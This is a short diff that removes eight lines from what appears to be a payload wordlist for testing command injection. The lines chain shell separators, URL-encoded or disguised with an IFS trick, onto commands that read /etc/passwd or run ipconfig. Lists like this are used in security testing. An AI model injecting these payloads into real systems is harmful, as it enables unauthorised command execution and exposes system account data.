@@ -1,8 +1,0 @@
-%3Bcat%20/etc/passwd
-%26%26cat%20/etc/passwd
-%26cat%20/etc/passwd
-%7C%7Ccat&20/etc/passwd
-1;cat${IFS%??}/etc/passwd;
-%3Bipconfig
-%26ipconfig
-%7Cipconfig
